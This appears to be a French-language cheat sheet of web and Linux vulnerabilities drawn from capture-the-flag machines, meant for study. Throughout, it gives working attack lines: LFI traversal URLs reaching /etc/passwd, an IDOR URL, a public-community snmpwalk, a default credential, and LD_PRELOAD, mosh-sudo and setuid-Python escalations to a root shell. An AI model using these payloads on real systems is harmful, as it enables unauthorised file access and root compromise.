# 🛡️ Cheat Sheet — Vulnérabilités

## 🔍 LFI (Local File Inclusion)
- **Définition** : Inclusion d’un fichier local via une entrée non filtrée.
- **Exploitation typique** :
  ```http
  http://<ip>/?page=../../../etc/passwd
  http://<ip>/download?ticket=../../...
Exemple machine : Titanic
## 🛢️ Database Exposure

Définition : Base de données exposée sans authentification.
Exploitation typique : Télécharger un fichier .db, l’ouvrir avec sqlite3.
Exemple machine : Titanic

## 🔐 Credential Leakage

Définition : Présence de hashs dans une base ou config.
Exploitation typique : Extraction puis cracking avec hashcat.
Exemple machine : Titanic

## 📦 LD_PRELOAD

Définition : Injection d’une bibliothèque partagée pour exécuter du code avec sudo.
Exploitation typique :
Créer un .so avec une fonction _init()
Utilisation : LD_PRELOAD=./lib.so sudo <commande>
Exemple machine : Titanic

## 🆔 IDOR (Insecure Direct Object Reference)

Définition : Accès non autorisé via manipulation d’un identifiant dans l’URL.
Exploitation typique :
http://<ip>/data?id=0
Effet : Accès à des fichiers ou données sensibles.

## 📡 FTP en clair

Définition : Les identifiants FTP circulent sans chiffrement.
Exploitation typique :
Analyse d’un fichier .pcap dans Wireshark
Extraction de credentials FTP en clair.

## 📊 SNMP Misconfiguration

Définition : SNMP exposé avec string "public".
Exploitation typique :
snmpwalk -v2c -c public <ip>
Effet : Récupération de noms d’utilisateur, config, chemins sensibles.
Exemple : daloRADIUS exposé via SNMP.

## 🔑 Weak Default Credentials

Définition : Identifiants par défaut non changés.
Exploitation typique :
administrator:radius

## 🧂 MD5 Hash exposé

Définition : Hash MD5 sans salt ni renforcement.
Exploitation typique : Cracking facile avec john ou hashcat + rockyou.txt.

## ⚙️ Sudo Misconfiguration

Définition : Binaire exécutable avec sudo sans mot de passe.
Exploitation typique :
mosh --server="sudo /usr/bin/mosh-server" localhost
Effet : Shell root.

## 🐍 SetUID Python Binary

Définition : Binaire Python avec le bit SUID.
Exploitation typique (en local) :
import os
os.setuid(0)
os.system("/bin/bash")
Effet : Shell root.